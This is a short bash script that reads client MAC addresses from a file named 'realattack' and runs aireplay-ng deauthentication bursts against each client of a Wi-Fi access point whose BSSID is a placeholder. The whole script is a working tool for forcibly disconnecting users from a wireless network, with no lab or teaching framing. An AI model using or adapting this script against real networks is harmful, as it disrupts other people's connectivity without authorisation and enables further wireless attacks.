#!/bin/bash

BSSID24="00:00:00:00:00:00"
GHZ24=adapter



for deauth in $(cat realattack); do
if [[ $deauth = "< | HWaddress" ]]; then
	echo ""
else
sudo aireplay-ng --deauth 30 -a $BSSID24 -c $deauth $GHZ24
fi
done

